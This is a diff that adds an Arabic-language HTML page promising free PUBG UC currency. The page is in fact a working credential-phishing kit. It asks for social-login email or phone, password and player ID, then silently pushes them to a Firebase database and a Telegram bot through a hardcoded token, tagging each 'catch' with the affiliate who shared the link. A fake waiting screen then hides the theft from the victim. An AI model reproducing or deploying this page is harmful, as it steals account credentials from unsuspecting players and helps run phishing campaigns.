@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن شدات ببجي مجاني</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <style>
+        /* دمج ملفات CSS (style.css, login.css, waiting.css) */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        
+        body {
+            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
+            background-size: 400% 400%;
+            animation: backgroundAnimation 6s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+        }
+
+        @keyframes backgroundAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* التحكم في ظهور الأقسام */
+        .page-section { display: none; width: 100%; max-width: 500px; padding: 20px; }
+        .active { display: block; }
+
+        /* ستايل الصفحة الرئيسية */
+        .main-container { background: black; padding: 30px; border-radius: 15px; border: 1px solid #444; }
+        .social-item {
+            background: #333; padding: 15px; border-radius: 8px; margin: 10px 0;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .social-item img { width: 40px; margin-left: 10px; }
+        
+        /* ستايل صفحة تسجيل الدخول */
+        .login-container { background: white; color: #333; padding: 30px; border-radius: 15px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        .buy-btn, .submit-btn {
+            background: #ff5722; color: white; border: none; padding: 12px; width: 100%;
+            border-radius: 5px; font-size: 18px; cursor: pointer;
+        }
+
+        /* ستايل صفحة الانتظار */
+        .progress-container { width: 100%; background: #ddd; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { width: 100%; height: 100%; background: red; transition: width 1s linear; }
+        .error-message { color: red; font-size: 14px; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+    <div id="home-page" class="page-section active">
+        <div class="main-container">
+            <h2>UC مجاني شحن ببجي بطريقه مجانيه 🚀⚡</h2>
+            <p style="margin: 15px 0;">سجل دخولك اولاً و من ثم اشحن</p>
+            <div class="social-media">
+                <div class="social-item" onclick="goToLogin('Facebook')">
+                    <img src="https://i.postimg.cc/Hn9d715L/1000209419-removebg-preview.png" alt="">
+                    <span>Facebook</span>
+                </div>
+                <div class="social-item" onclick="goToLogin('Twitter')">
+                    <img src="https://i.postimg.cc/Bn64tyvq/1000209420-removebg-preview.png" alt="">
+                    <span>Twitter</span>
+                </div>
+                <div class="social-item" onclick="goToLogin('Google')">
+                    <img src="https://i.postimg.cc/QCsvmkhm/1000209421-removebg-preview.png" alt="">
+                    <span>Google</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="login-page" class="page-section">
+        <div class="login-container">
+            <h1 style="color: #ff5722;">تسجيل الدخول</h1>
+            <p>يرجى ملء الحقول الآتيه لكي تصلك الشدات</p>
+            <input type="text" id="username" placeholder="البريد الإلكتروني او رقم الهاتف">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <input type="text" id="player-id" placeholder="الايدي (ID)">
+            <select id="uc-amount">
+                <option value="325">325 مجاني ⚡</option>
+                <option value="660">660 شراء 🚀</option>
+                <option value="1000">1000 شراء ⚡</option>
+            </select>
+            <button class="submit-btn" onclick="validateAndSend()">إنشاء طلب</button>
+            <p class="error-message" id="error-message"></p>
+        </div>
+    </div>
+
+    <div id="waiting-page" class="page-section">
+        <div class="login-container">
+            <h1 style="color: red;">جاري إرسال الطلب...</h1>
+            <p>يتم تجهيز طلبك في غضون 24 ساعة</p>
+            <img src="https://i.postimg.cc/FFy4S1NG/1000209418-removebg-preview.png" width="60" style="margin: 15px;">
+            <div class="progress-container">
+                <div class="progress-bar" id="progress"></div>
+            </div>
+            <p id="countdown" style="font-weight: bold; font-size: 24px;">20</p>
+        </div>
+    </div>
+
+    <script>
+        // --- إعدادات البيانات ---
+        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+        const adminChatId = "5375214810";
+        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
+        
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function getUserFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("id") || params.get("user_id") || "غير معروف";
+        }
+
+        // --- وظائف التنقل ---
+        function goToLogin(platform) {
+            document.getElementById('home-page').classList.remove('active');
+            document.getElementById('login-page').classList.add('active');
+            sendTelegramMessage(`👤 مستخدم اختار: ${platform}`);
+        }
+
+        async function validateAndSend() {
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+            const pid = document.getElementById("player-id").value;
+            const error = document.getElementById("error-message");
+            const userId = getUserFromURL();
+
+            if (!user || !pass || !pid) {
+                error.textContent = "يرجى ملء جميع الحقول!";
+                return;
+            }
+
+            // إرسال لـ Firebase
+            db.ref('hits/' + userId + '/Login_Data').push({
+                user, pass, pid, time: new Date().toLocaleString('ar-EG')
+            });
+
+            // إرسال لـ Telegram
+            const msg = `🚀 صيدة جديدة\n👤 الحساب: ${user}\n🔑 الباسورد: ${pass}\n🆔 ID اللاعب: ${pid}\n🔗 صاحب الرابط: ${userId}`;
+            sendTelegramMessage(msg);
+            if(userId !== "غير معروف") sendTelegramMessage(msg, userId);
+
+            // الانتقال لصفحة الانتظار
+            showWaitingPage();
+        }
+
+        function sendTelegramMessage(text, chatId = adminChatId) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        }
+
+        function showWaitingPage() {
+            document.getElementById('login-page').classList.remove('active');
+            document.getElementById('waiting-page').classList.add('active');
+            
+            let timeLeft = 20;
+            const countdown = document.getElementById("countdown");
+            const progress = document.getElementById("progress");
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                countdown.textContent = timeLeft;
+                progress.style.width = (timeLeft / 20) * 100 + "%";
+                if (timeLeft <= 0) clearInterval(timer);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
